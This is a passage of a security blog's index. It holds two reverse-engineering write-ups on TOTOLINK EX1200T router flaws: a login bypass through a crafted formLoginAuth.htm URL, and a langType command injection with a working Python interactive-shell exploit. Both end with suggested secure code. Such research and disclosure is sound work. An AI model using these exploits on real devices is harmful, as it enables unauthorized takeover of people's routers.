for sure. but it’s important to consider the recognition of the certificate in the market or in the country you are targeting, as it may not be recognized in some areas.   Resources      Information Gathering:            https://vk9-sec.com/red-team/information-gathering/       https://web.archive.org/web/20200309204648/http://www.0daysecurity.com/penetration-testing/enumeration.html           Exploitation:            https://vk9-sec.com/red-team/exploitation/           Post-Exploitation:            https://web.archive.org/web/20150317144317/https:/n0where.net/linux-post-exploitation       https://vk9-sec.com/category/red-team/post-exploitation/linux-post-exploitation/       https://vk9-sec.com/red-team/post-exploitation/           Pivoting:            https://fuzzysecurity.com/tutorials/25.html,       https://catharsis.net.au/blog/network-pivoting-and-tunneling-guide/       https://hackmag.com/security/windows-pivoting/       https://pentest.blog/explore-hidden-networks-with-double-pivoting/           cheatsheet:            https://drive.google.com/file/d/1wC7RMTrWjt74rO8u4X-zM89T_hZzF_A5/view           Notes:            https://drive.google.com/file/d/1H0Iq0_oU6-oUOkpzDZclUjw1EbsZWWiW/view       https://zer0verflow.gitbook.io/ecpptv2-notes/          ","categories": ["Certificates"],
        "tags": [],
        "url": "http://localhost:5000/certificates/ecppt/",
        "teaser": "http://localhost:5000/assets/images/8af57b4c88376835da96618d6b2b8d40.png"
      },{
        "title": "CVE-2021-42887: TOTOLINK EX1200T LOGIN BYPASS",
        "excerpt":"Introduction   A vulnerability discovered in TOTOLINK EX1200T model known as CVE-2021-42887 which lead to authentication bypass, as a results anyone exploit this vulnerability by sending a specific request through formLoginAuth.htm page will be able to access the device without a need to login then control the device. Note:(Everything you obtain here is for educational purposes, Don't use or abuse any bug against any target without permissions)   Obtaining the Firmware   Before we start we would need the firmware of the device, Therefore We can take a static look at the code and how it works to understand more. So, what we need is the vulnerable Firmware for the device which is V4.1.2cu.5215 and we have many ways to do it:           You can search for the firmware on the official website for the vendor.            Download it from any other source (after someone already dump it from the device and published it).            Dump the firmware through UART, You could read a detailed blog from Here.            Also, you could contact the support to provide you with the firmware.            Finally dumping the firmware using CH341A Mini programmer USB, You could read a detailed blog from Here.       In my case, I found the firmware on the vendor website. Now, Let’s extract the firmware using binwalk tool as the following binwalk -e --run-as=root \"TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web\" and here is the output:   $ ls TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web $ sudo binwalk -e --run-as=root \"TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web\" [sudo] password for azima:  DECIMAL       HEXADECIMAL     DESCRIPTION -------------------------------------------------------------------------------- 76            0x4C            JFFS2 filesystem, little endian 209052        0x3309C         Zlib compressed data, compressed 209388        0x331EC         Zlib compressed data, compressed 210144        0x334E0         Zlib compressed data, compressed 210832        0x33790         JFFS2 filesystem, little endian 231428        0x38804         Zlib compressed data, compressed 231988        0x38A34         Zlib compressed data, compressed 232548        0x38C64         Zlib compressed data, compressed 233116        0x38E9C         Zlib compressed data, compressed 233560        0x39058         JFFS2 filesystem, little endian 254344        0x3E188         Zlib compressed data, compressed 254696        0x3E2E8         JFFS2 filesystem, little endian 255224        0x3E4F8         Zlib compressed data, compressed 256064        0x3E840         JFFS2 filesystem, little endian 321636        0x4E864         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 6526520 bytes   And as i am using Windows Subsystem Linux (WSL), Here we can browser our firmware normally:      The Analysis   It’s the time for the analysis. We will need Burp Suite to see how is the request of the authentication looks like on the device before it’s go to the device web server.          As we can see in the above screenshot from Burp Suite, We can notice that the web app made out of Aasp.net and the formLoginAuth.htm is requested, If we go to it and take a look at the request which is as the following:   GET /formLoginAuth.htm?authCode=1&amp;userName=admin&amp;password=admin&amp;goURL=home.asp&amp;action=login HTTP/1.1 Host: 192.168.0.254 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://192.168.0.254/login.asp DNT: 1 Connection: close Upgrade-Insecure-Requests: 1   We can guess that this html page take the parameters as the following: authCode, userName, password, goURL &amp; action. And then pass it to one of the ASP endpoints. So, Let’s go to the firmware we extracted and check the formLoginAuth.htm. Before that we can see also the login.asp, But if we go to it the request and the following:   GET /login.asp HTTP/1.1 Host: 192.168.0.254 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Referer: http://192.168.0.254/ Upgrade-Insecure-Requests: 1 If-Modified-Since: Thu, 01 Jan 1970 00:00:03 GMT If-None-Match: \"-1518032379\"   And if you take a look at the URL it just for the login page you see. Let’s move forward with formLoginAuth.htm. By going to the \\squashfs-root\\web_cste directory we can find our web app files:          As you can see we can’t find formLoginAuth.htm you may think this page only get generated on the login process at the Runtime. Unforently, I checked it by accessing the device through telnet and it’s not get created. But, we have our login.asp page let’s take a look on this page. While going through the code ypu can notice that the login request is sent to cstecgi.cgi page in the cgi-bin directory:              And by going back to Burp Suite again, You can find the following requests made to the page:          We can see the login request obvious and by checking it out we can confirm it’s where the login request get process through it:   POST /cgi-bin/cstecgi.cgi?action=login HTTP/1.1 Host: 192.168.0.254 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 29 Origin: http://192.168.0.254 DNT: 1 Connection: close Referer: http://192.168.0.254/login.asp Upgrade-Insecure-Requests: 1  username=admin&amp;password=admin   Now, By going to the file and check it with the file command, We can see it’s an ELF 32bit MIPS file:      It’s the time to do some reverse using Ghidra, Open it and create a new project i named it EX1200T for the device name and drop the cstecgi.cgi file into the project:      After that open the file using Code Browser within Ghidra:      Then, analysis the file:      Navigating to Symbol Tree and let’s check out the functions:      After going through the functions clearly inside FUN_00400dd8 function we can see the following lines of codes. But, there is no thing interesting and it’s all about functions calling other functions:      We just can see that httpStatus, redirectURL &amp; responseParam being passed to some unclear functions. But, After a long time of searching you can see under \\squashfs-root\\lib\\cste_modules folder that there are libraries named as the following:   app.so cloudupdate.so global.so lan.so product.so system.so upgrade.so wireless.so wps.so   After reversing this libraries you will know that it’s clearly used by the cstecgi.cgi to perform different operations and changes through the device panel. Let’s identify which one perform the login process by searching through the following Bash one liner using strings command:   for i in $(ls -la | awk '{print $9}' | grep \".so\"); do echo \"\"; echo \"Lib Name: $i\"; strings $i | grep \"login\"; done   The above line will print the library name after this will run the strings command on the library to get any string has the work login and will print the results under the library name. Therefore, we will be able to know which library contains the login process or anything related. Command output:   Lib Name: app.so  Lib Name: cloudupdate.so  Lib Name: global.so loginAuth loginflag loginAuth loginAuthUrl mobile/login.asp login.asp ,\"redirectURL\":\"http://%s/formLoginAuth.htm?authCode=%d&amp;userName=%s&amp;password=%s&amp;goURL=%s&amp;action=login&amp;flag=1\"} ,\"redirectURL\":\"http://%s/formLoginAuth.htm?authCode=%d&amp;userName=%s&amp;password=%s&amp;goURL=%s&amp;action=login\"} loginpass loginFlag loginIp  Lib Name: lan.so  Lib Name: product.so  Lib Name: system.so  Lib Name: upgrade.so  Lib Name: wireless.so  Lib Name: wps.so   And as we can see it’s with-in the global.so library, As we did with the cstecgi.cgi file. Let’s do the same with the library with Ghidra. After opening the Functions tab under Symbol Tree we can notice the loginAuth function:      So, the flaw of the login process is as the following:      Now, Let’s navigate to the function and understand what this function do and how it works. First the function start by taking 3 parameters   void loginAuth(undefined4 param_1,undefined4 param_2,undefined4 param_3)   Which are param_1, param_2 and param_3. By going through the rest of the code you gonna see that mostly are declaring of variables, Until we reach the line number 73:      We can see here it’s created 3 variables:           uVar1: In this variable it’s assigning a value of calling a function called websGetVar() and passing param_2, LoginAuthUrl which it could be the HTML page and an empty string at the end. (We will back to this function used again)            uVar2 : Here it’s assigning this variable to store json objects.            iVar5: Here it’s assigning 0.    after that we can see a while loop and inside the loop we can see the following:         while( true ) {     iVar8 = iVar5 + 1;     iVar5 = getNthValueSafe(iVar5,uVar1,0x26,auStack_1718,0x400);     if (iVar5 == -1) break;     iVar3 = getNthValueSafe(0,auStack_1718,0x3d,auStack_1318,0x80);     iVar5 = iVar8;     if ((iVar3 != -1) &amp;&amp;        (iVar8 = getNthValueSafe(1,auStack_1718,0x3d,auStack_1298,0x100), iVar8 != -1)) {       uVar4 = cJSON_CreateString(auStack_1298);       cJSON_AddItemToObject(uVar2,auStack_1318,uVar4);     }   }   In this loop it’s adding 1 to iVar5 which is 0 above and after that assign the result to iVar8 variable. After that calling a function getNthValueSafe() and passing unknown parameters to it after that assign the result to iVar5. Then, there is an if condition checks for the value of iVar5 if it’s equal to -1 it will break the loop and if this condition didn’t executed it do the same before the condition with the iVar5 and getNthValueSafe() function but with different parameters and assign it to iVar3. Then, It will get back the value of iVar5 by assigning the value of iVar8 to it. in the second if condition it checks if iVar3 &amp; the iVar8(After assign the getNthValueSafe() to it) values are not equal to -1 then it will create unknown JSON string and assign it to uVar4, Finally it will add an item to object to uVar2 which created before and it’s the JSON data then auStack_1318 which is the key and uVar4 which is the value. Let’s move forward with the rest of lines:   __s1 = (char *)websGetVar(uVar2,\"username\",\"admin\"); pcVar6 = (char *)websGetVar(uVar2,\"password\",\"\"); __src = (char *)websGetVar(uVar2,\"http_host\",\"\"); __nptr = (char *)websGetVar(uVar2,&amp;DAT_0001dd80,\"\"); apmib_get(0xb6,&amp;local_1198); apmib_get(0xb7,&amp;local_1174); apmib_get(0xc0,&amp;local_17a0);   Here we can see the following assigned variables which store values retrived by websGetVar() function let’s go step by step:           __s1: storing the value retrieved with username from the http request and the admin value will be used if the requested variable is not found.            pcVar6: storing the value retrieved with password from the http request and the \"\" value will be used if the requested variable is not found.            __src: storing the value retrieved with http_host from the http request and the \"\" value will be used if the requested variable is not found.            __nptr: storing the value referenced by the memory address &amp;DAT_0001dd80 from the http request and the \"\" value will be used if the requested variable is not found.       Note: let’s rename each variable that stores a value so we can make the code more clearly.  Finally, each call for the apmib_get() function is for retrieving a value from a data structure and storing it in a local variable local_x for later use. So, we can complete with the rest of the code:          After renaming the variables, We can see it’s became more clearly now. IN the lines after the previous lines, There is an IF condition which checks if the first character of Host is null character or no, If that true it will call a function named getLanIp() and from it’s name we can guess it’s getting the IP address for the device NIC so the acStack_1150 variable is the device interface. So, let’s rename it and after we rename it. Everything is clear it checks for the Hostname or IP. Finally, if it’s not then it will copy the Host value to the deviceInterface which also could be a host-name.      By checking the next line, It also another condition to check the username and password:      It checks if the userName or passWord is null character or no, If yes, then it will set the loginflag to 1 which maybe indicates that the login is failed. and if this doesn’t happen it comparing the userName with local_1198 and store the results to iVar5 and for the local_1198 then if the results not equal to 0 that means it fails and will set the loginflag to 1, if we go to the previous line we can see that this variable in the following line apmib_get(0xb6,&amp;local_1198); and we remember that the apmlib_get() function is for retrieving a value from a data structure and storing it in a local variable and by doing some search the value is from the configuration. So, we can guess that this variable carry the device username so let’s rename it. And moving to the next lines:      As we can see there is passwordTrans() function which takes 2 parameters the passWord parameter and another parameter which is acStack_50. By clicking on the passwordTrans() function we can see the following code:   void passwordTrans(int param_1,char *param_2)  {   char cVar1;   int iVar2;   int iVar3;   int iVar4;   char *pcVar5;      iVar4 = 1;   iVar3 = 0;   pcVar5 = param_2;   while( true ) {     cVar1 = *(char *)(param_1 + iVar3);     if (cVar1 == '\\0') break;     if (cVar1 == '%') {       iVar2 = hextochar(*(char *)(param_1 + iVar3 + 1),*(char *)(param_1 + iVar3 + 2));       *pcVar5 = (char)iVar2;       iVar3 = iVar3 + 3;     }     else {       *pcVar5 = cVar1;       iVar3 = iVar3 + 1;     }     iVar4 = iVar4 + 1;     pcVar5 = pcVar5 + 1;   }   param_2[iVar4 + -1] = '\\0';   return; }   Basically, the passwordTrans() function appears to take a encoded password string and returns the decoded password string by replacing any percent encoded characters with their ASCII equivalent characters by iterating through each character in the password string, checking if the character is a percent sign and converting the two hexadecimal characters following the percent sign to their ASCII equivalent, Then it saves it in the second passed parameter which in this case is acStack_50. So, We can guess that this is the final password, Let’s rename it to finalPassword. By going back to our loginAuth() function. After the passwordTrans() function call we can see the following:      Here it compares the finalPassword with a variable loaded using memset() function and we can guess it’s the configured password (so we will rename it to devicePassword), and it’s assign the result into the iVar5 &amp; After that it checks if the iVar5 is not equal to 0 which indicates that the login is not successful and set the loginflag to 1. After that coming the next lines      It comparing the userName provided by the user with the one in the device which is deviceUserName and storing the results, then it checks if iVar5 is equal to 0 and do another compare between finalPassword and devicePassword and save the results also in iVar5. If the condition is true then it will set the loginflag to 0, As a results the login is successful. After that it uses the apmib_get() function to get some configuration. And now by looking into the next lines:      In these lines it’s all about conditions that will be executed, If the previous condition is true. By taking a look we can see it checks if the local_17a0 is equal to 0 which we don’t know yet. Then it create the iVar5 stores the value of __nptr which converted by atoi() function which converts a string of characters representing an integer value into an actual integer value. Then it checks if iVar5 to 1 and then assign some values to the local_x variables in this point if we take a look at the disassembled code we can notice the following:      And now it’s obvious that it loads a word and it’s is mobie/home.asp which is a mobile user endpoint, Now we can say that the __nptr is used to check if the user is on Desktop or Mobile, So let’s rename it as mobileUser and rename the local_x variables and it’s values. So we can say the code will be as the following:   iVar5 = atoi(mobileUser); if (iVar5 == 1) {     endPoint = \"mobile/home.asp\"; }   If this condition didn’t achieved then it will check for the Desktop User as we can see also in the disassembled code has the home.asp without mobile:      And after that if the user desktop or mobile is not identified it will be wizard.asp endpoint as we can see:      So, the full clear code as the following:   if (local_17a0 == 0) {   iVar5 = atoi(mobileUser);   if (iVar5 == 1) {         endPoint = \"mobile/home.asp\";   }   else if (desktopUser == 1) {         endPoint = \"home.asp\";   }   else {         endPoint = \"wizard.asp\";   }   Now, if the first condition which is if (local_17a0 == 0) { not true then it will jump to the following:      Which also check if the User is on mobile or desktop, Then back to the condition that check the credentials which is if ((iVar5 == 0) &amp;&amp; (iVar5 = strcmp(finalPassword,(char *)&amp;devicePassword), iVar5 == 0) if it’s not true it will check if the user is on mobile or no and assign the mobile/login.asp endpoint which the user will redirect to it:      So, the clear code for this is as the following:   if (local_17a0 == 0) {   iVar5 = atoi(mobileUser);   if (iVar5 == 1) {         endPoint = \"mobile/home.asp\";   }   else if (desktopUser == 1) {         endPoint = \"home.asp\";   }   else {         endPoint = \"wizard.asp\";   } else { iVar5 = atoi(mobileUser);     if (iVar5 == 1) {   endPoint = \"mobile/login.asp\";   iVar5 = 0; }     else {   endPoint = \"login.asp\";   iVar5 = 0; } }   From the clear code we can guess that local_17a0 is checks for the authentication or the login. So, we will rename it to isAuth. Now, we getting closer to the place of the bug as we see:   snprintf(acStack_1050,0x1000,\"{\\\"httpStatus\\\":\\\"%s\\\",\\\"host\\\":\\\"%s\\\"\",\"302\",deviceInterface);   Here, It assigns the status of request to the acSTack_1050 we can rename it to reqResponse, In this case it will redirect the user to the login page as authentication failed, Then it will assign the length of the reqResonse to sVar6 = strlen(reqResponse); to prevent overflow attacks. Now, coming here we gonna see it does a check again on the user to see if it’s on Desktop or mobile and here what the developer missed it out:      Out of the first checks this code assign the following to the response if the user is on mobile:   snprintf(reqResponse + sVar6,0x1000 - sVar6,          \",\\\"redirectURL\\\":\\\"http://%s/formLoginAuth.htm?authCode=%d&amp;userName=%s&amp;password=%s&amp;goU RL=%s&amp;action=login&amp;flag=1\\\"}\"          ,deviceInterface,iVar5,userName,finalPassword,(char *)&amp;local_1798);   The values of the parameters as the following the first %s is for the deviceInterface then the second one is %d which is for iVar5 and if we back to the code where the login check failed it assigned 0 to the iVar5, So we can say that the iVar5 here in this case is for authCode and it’s equal 0 and here it comes the issue as the authCode value can be passed by the user through a request it can be manipulate all of these parameters. By the way, If it’s not mobile user it will do the same response, But without the flag=1 which indicates that user is mobile. Now, let’s take this response URL and manipulate it:   mydevice/formLoginAuth.htm?authCode=1&amp;userName=admin&amp;password=Idontneedit&amp;goURL=home.asp&amp;action=login   If we try it we will be able to see that we bypassed all these checks as the mistakes done by the developer to assign the redirect and response out of the checks.          Final Thoughts   The developer created a big mistake in 2 things first sending the response out and after of the checks &amp; relay on authCode parameter results and it can be manipulated by the user. The developer shall assign the authCod hardcoded and not editable by the user. But, the best solution is to relay on the username and password as any authentication process which happens in the code and not send them back to the response. The secure code can be as the following:   // If authentication success if (isAuth == 0) {           // create sessin for user       snprintf(Session, Session_Length, \"Set-Cookie: session_id=%s; Path=/\\n\", session_id);   iVar5 = atoi(mobileUser);     // If user on mobile   if (iVar5 == 1) {       // assign mobile endpoint         endPoint = \"mobile/home.asp\";              // set user authentication to successful         snprintf(reqResponse + sVar6,0x1000 - sVar6,          \",\\\"redirectURL\\\":\\\"http://%s/formLoginAuth.htm?goURL=%s&amp;action=login&amp;flag=1\\\"}\"          ,deviceInterface,(char *)&amp;endPoint);       // send the response to user and exit         websGetCfgResponse(param_1,param_3,reqResponse, Session);         exit(0);   }     // if it's a desktop user   else if (desktopUser == 1) {       // assign desktop endpoint         endPoint = \"home.asp\";       // set user authentication to successful         snprintf(reqResponse + sVar6,0x1000 - sVar6,          \",\\\"redirectURL\\\":\\\"http://%s/formLoginAuth.htm?goURL=%s&amp;action=login\\\"}\"          ,deviceInterface,(char *)&amp;endPoint);       // send the response to user and exit         websGetCfgResponse(param_1,param_3,reqResponse, Session);         exit(0);   }     // if it's not known mobile or desktop   else {       // assign wizard.asp endpoint         endPoint = \"wizard.asp\";       // set user authentication to successful         snprintf(reqResponse + sVar6,0x1000 - sVar6,          \",\\\"redirectURL\\\":\\\"http://%s/formLoginAuth.htm?goURL=%s&amp;action=login\\\"}\"          ,deviceInterface,userName,finalPassword,(char *)&amp;endPoint);        // send the response to user and exit         websGetCfgResponse(param_1,param_3,reqResponse, Session);         exit(0);   }  // If authentication not success else { iVar5 = atoi(mobileUser);     // If user on mobile   if (iVar5 == 1) {       // assign mobile endpoint   endPoint = \"mobile/login.asp\";   // send the response to user and exit       snprintf(reqResponse,0x1000,\"{\\\"httpStatus\\\":\\\"%s\\\",\\\"host\\\":\\\"%s\\\"\",\"302\",deviceInterface, endPoint);         websGetCfgResponse(param_1,param_3,reqResponse, Session);         exit(0); }     // if it's a desktop user or else   else {       // assign desktop endpoint   endPoint = \"login.asp\";         // send the response to user and exit       snprintf(reqResponse,0x1000,\"{\\\"httpStatus\\\":\\\"%s\\\",\\\"host\\\":\\\"%s\\\"\",\"302\",deviceInterface, endPoint);       websGetCfgResponse(param_1,param_3,reqResponse, Session);       exit(0); } }   In this code the developer will not relay on the authCode and after any condition came true it will send the response to the user and exit immediately, Which leaves no chance for the user to do anything.       Conclusion   In this analysis we saw the root cause of the issue and how it can be solved in an example code, Also how we can analysis the unclear decompiled code to understand as much as we can of the code and make it clear.Finally, You have to keep each code under it’s condition.       References           https://www.totolink.net/home/news/me_name/id/39/menu_listtpl/DownloadC.html            https://github.com/p1Kk/vuln/blob/dcc2b75ab49f8cb0bdadf6f3c5d6b379a73e57c5/totolink_ex1200t_login_bypass.md            https://ghidra-sre.org/            https://github.com/scriptingxss/owasp-fstm/releases/download/v1.0/Firmware_Security_Testing_Methodology_Version1.pdf               #CVE-2021-42887  ","categories": ["IoT Exploitation"],
        "tags": [],
        "url": "http://localhost:5000/iot%20exploitation/CVE_2021_42887/",
        "teaser": "http://localhost:5000/assets/images/clf6qyw3s1ida0kqjfuacee8r.png"
      },{
        "title": "CVE-2021-42888: TOTOLINK EX1200T Remote Command Injection",
        "excerpt":"Introduction   A vulnerability discovered in TOTOLINK EX1200T model known as CVE-2021-42888 which lead to Remote Command Injection, as a results anyone exploit this vulnerability by sending a crafted request through langType parameter when setting the language will be able to to inject arbitrary commands and will get executed by the device. Note:(Everything you obtain here is for educational purposes, Don't use or abuse any bug against any target without permissions)   Obtaining the Firmware   Before we start we would need the firmware of the device, Therefore We can take a static look at the code and how it works to understand more. So, what we need is the vulnerable Firmware for the device which is V4.1.2cu.5215 and we have many ways to do it:           You can search for the firmware on the official website for the vendor.            Download it from any other source (after someone already dump it from the device and published it).            Dump the firmware through UART, You could read a detailed blog from Here.            Also, you could contact the support to provide you with the firmware.            Finally dumping the firmware using CH341A Mini programmer USB, You could read a detailed blog from Here.       In my case, I found the firmware on the vendor website. Now, Let’s extract the firmware using binwalk tool as the following binwalk -e --run-as=root \"TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web\" and here is the output:   $ ls TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web $ sudo binwalk -e --run-as=root \"TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web\" [sudo] password for azima:  DECIMAL       HEXADECIMAL     DESCRIPTION -------------------------------------------------------------------------------- 76            0x4C            JFFS2 filesystem, little endian 209052        0x3309C         Zlib compressed data, compressed 209388        0x331EC         Zlib compressed data, compressed 210144        0x334E0         Zlib compressed data, compressed 210832        0x33790         JFFS2 filesystem, little endian 231428        0x38804         Zlib compressed data, compressed 231988        0x38A34         Zlib compressed data, compressed 232548        0x38C64         Zlib compressed data, compressed 233116        0x38E9C         Zlib compressed data, compressed 233560        0x39058         JFFS2 filesystem, little endian 254344        0x3E188         Zlib compressed data, compressed 254696        0x3E2E8         JFFS2 filesystem, little endian 255224        0x3E4F8         Zlib compressed data, compressed 256064        0x3E840         JFFS2 filesystem, little endian 321636        0x4E864         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 6526520 bytes   And as i am using Windows Subsystem Linux (WSL), Here we can browser our firmware normally:          The Analysis   It’s the time for the analysis. We will need Burp Suite to see how is the request of the Language set looks like on the device before it’s go to the device web server and how/why it executes the value as a command. When we open the web panel, We can notice that there is a menu list on the right-top that contains the language.      Now, when we change the language and look at requests made through burp suite will find the following:      And by navigating to the request made to change the language which has the langType parameter the request is as the following:   POST /cgi-bin/cstecgi.cgi HTTP/1.1 Host: 192.168.0.254 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 68 Origin: http://192.168.0.254 DNT: 1 Connection: close Referer: http://192.168.0.254/login.asp  {\"topicurl\":\"setting/setLanguageCfg\",\"langType\":\"en\",\"langFlag\":\"1\"}   Let’s go with Ghidra and reverse the cstecgi.cgi file. Now, By going to the file and check it with the file command, We can see it’s an ELF 32bit MIPS file:      Open it and create a new project i named it EX1200T for the device name and drop the cstecgi.cgi file into the project:      After that open the file using Code Browser within Ghidra:      Then, analysis the file:      Navigating to Symbol Tree and let’s check out the functions:      After going through the functions clearly inside FUN_00400dd8 function we can see the following lines of codes. But, there is no thing interesting and it’s all about functions calling other functions:      We just can see that httpStatus, redirectURL &amp; responseParam being passed to some unclear functions.Also, If we search for any string contains the work lang, We can see there is nothing can be found:      But, You can see under \\squashfs-root\\lib\\cste_modules folder that there are libraries named as the following:   app.so cloudupdate.so global.so lan.so product.so system.so upgrade.so wireless.so wps.so   After reversing this libraries you will know that it’s clearly used by the cstecgi.cgi to perform different operations and changes through the device panel. Let’s identify which one perform the changing language process by searching through the following Bash one liner using strings command:   for i in $(ls -la | awk '{print $9}' | grep \".so\"); do echo \"\"; echo \"Lib Name: $i\"; strings $i | grep \"langType\"; done   The above line will print the library name after this will run the strings command on the library to get any string has the work langType and will print the results under the library name. Therefore, we will be able to know which library contains the language changing process or anything related. Command output:   Lib Name: Fastjson.txt  Lib Name: app.so  Lib Name: cloudupdate.so  Lib Name: global.so langType  Lib Name: lan.so  Lib Name: product.so  Lib Name: system.so  Lib Name: upgrade.so  Lib Name: wireless.so  Lib Name: wps.so   And as we can see it’s with-in the global.so library, As we did with the cstecgi.cgi file. Let’s do the same with the library with Ghidra. After opening the Functions tab under Symbol Tree we can notice the setLanguageCfg function:      So, we can say the language process is as the following:      Now, Let’s navigate to the function and understand what this function do and how it works. First the function start by taking 3 parameters   undefined4 setLanguageCfg(undefined4 param_1,undefined4 param_2,undefined4 param_3)   Which are param_1, param_2 and param_3. By going through the rest of the code you gonna see that mostly are declaring of variables, Until we reach the line number 31:      We can see here it’s created 2 variables:           param2: which stores the value that the websGetVar() function will return which obvius that it will return the value of langType and assign it to param2 and if there is no value, It will assign the \"\" to param2 which is empty string.            __nptr: which stores the value that the websGetVar() function will return which obvius that it will return the value of langFlag and assign it to __nptr and if there is no value, It will assign the 1 to __nptr.       From what we saw we can change these variable names to the names of the request parameters and the call for the apmib_get() function is for retrieving a value from a data structure and storing it in param2 for later use. By complete reading through the code:   local_1c = atoi(langFlag); apmib_set(0x1777,&amp;local_1c);   the local_1c stores the value of langFlag which converted by atoi() function which converts a string of characters representing an integer value into an actual integer value. Then, again apmib_get() function is retrieving a value from a data structure and storing it in local_1c for later use. After that in the following lines:     iVar1 = f_exists(\"/mnt/custom/product.ini\");   if (iVar1 != 0) {     sprintf(acStack_140,\"helpUrl_%s\",langType);     inifile_get_string(\"/mnt/custom/product.ini\",\"PRODUCT\",acStack_140,&amp;local_40);     apmib_set(0x1bc8,&amp;local_40);   }   Here the iVar1 stores the return value of the f_exists function and it’s a custom function defined elsewhere in the code which checks if the /mnt/custom/product.ini file exists or no. Then, there is if condition checks if the value of iVar1 is not equal to 0 which mean that the file /mnt/custom/product.ini exists. If the condition is true the sprintf function will format a string and store it in acStack_140 and the formatted string consists of the literal string helpUrl_ is followed by the value of the variable langType. Then, apmib_get() function is retrieving a value from a data structure and storing it in local_40 for later use. Now, Coming to the following lines of codes is the place where the problem happens:   apmib_update_web(4); CsteSystem(\"rm -f /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1\",0); sprintf(acStack_140,\"/web_cste/js/language_%s.js\",langType); sprintf(acStack_140,\"ln -s /web_cste/js/language_%s.js /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1\",       langType); CsteSystem(acStack_140,0); websSetCfgResponse(param_1,param_3,&amp;DAT_0001eca4,\"reserv\"); return 0;   First, apmib_update_web(4) This function updating some configuration settings on the device, Moving to the next line which is a call to a custom function from it’s name and arguments we can see it’s executing commands and the command is rm -f /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1 and it’s clearly to remove the /web_cste/js/language.js file &amp; the 1&gt;/dev/null and 2&gt;&amp;1 redirection operators are used to suppress output from the command. Then, sprintf() function format a string into acStack_140 and The formatted string will be /web_cste/js/language_[langType].js and here where is the root cause of the problem cause the input is not filtered and by going to the following line CsteSystem(acStack_140,0); use CsteSystem() function again to execute the command stored in acStack_140 which includes the langType value that can be manipulated by the user &amp; In this case, The user can include malicious input. Let’s now exploit it. I connected the device through telnet services first:      Now, Let’s go to Burp Suite and manipulate the request and show a PoC for the vulnerability:      We can see our request and response is successfully and Basically we executed a command to print out the CVE number and store it inside poc.txt in the /tmp directory and if we navigate to the directory we can see clearly our file there and the CVE number:      But, We can see that it ends with .js, So we can print a new line or separate it with ; which separate commands in shell:      And here is it working well. Now, We can automate this process using python:   import requests import sys  print(f\"[*] Target: {sys.argv[1]} \\n\") url = f\"http://{sys.argv[1]}/cgi-bin/cstecgi.cgi\" headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"X-Requested-With\": \"XMLHttpRequest\"}  while True:     command = input(f\"{sys.argv[1]}@shell# \")     json = {\"langFlag\": \"1\", \"langType\": f\";{command} &gt; /web_cste/res.txt;\",             \"topicurl\": \"setting/setLanguageCfg\"}     req1 = requests.post(url, headers=headers, json=json)     if req1.status_code == 200:         print(f\"[+] Command: {command}\\n\")         req2 = requests.get(f\"http://{sys.argv[1]}/res.txt\", headers=headers)         print(\"[+] Results:\")         print(req2.text)         json = {\"langFlag\": \"1\", \"langType\": f\";rm -rf /web_cste/res.txt;\",                 \"topicurl\": \"setting/setLanguageCfg\"}         requests.post(url, headers=headers, json=json)     else:         print(\"[-] Error Command failed\")   So, Basically the code will take a target as a first argument and then the command from the user after that will send the command and save the results in res.txt file in the web root directory so it can be access in public, After that request the res.txt file and print out it’s output which also is the command out put then it will delete it.      Final Thoughts   The developer shall use an Asp endpoint to change the language as a different option instead of executing commands to move the JS files responsiable for the language, But, In our case of this code there are many solutions to make sure it will be hard for the user to escape the default command and inject malicious command as the following:   // Define an array of languages char* languages[] = {\"en\", \"ar\", \"ch\"};  // Get the number of languages in the array int numLanguages = sizeof(languages) / sizeof(languages[0]);  // Get the value of the langType parameter from the HTTP request langType = (char*)websGetVar(param_2, \"langType\", \"\");  // Check if langType has length of 2, exit without executing commands if it doesn't if (strlen(langType) != 2) { return 0; }  // Check if langType is included in the languages array, exit without executing commands if it's not int isIncluded = 0; for (int i = 0; i &lt; numLanguages; i++) { if (strcmp(langType, languages[i]) == 0) { isIncluded = 1; break; } } if (!isIncluded) { return 0; }  // Remove the existing language.js file 